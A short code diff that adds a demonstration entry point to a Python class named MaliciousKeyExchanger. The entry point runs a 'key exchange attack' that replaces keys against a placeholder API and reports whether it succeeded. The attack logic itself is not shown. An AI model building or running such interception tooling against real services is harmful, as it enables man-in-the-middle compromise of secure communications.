@@ -47,3 +47,13 @@ class MaliciousKeyExchanger:
         except requests.RequestException as error:
             print(f"Error during key exchange interception: {error}")
             return False
+
+# Usage example (for demonstration purposes only):
+if __name__ == "__main__":
+    attacker = MaliciousKeyExchanger()
+    target_api = "http://example.com"
+
+    if attacker.execute_key_replacement(target_api):
+        print("Key exchange attack executed successfully.")
+    else:
+        print("Key exchange attack failed.")
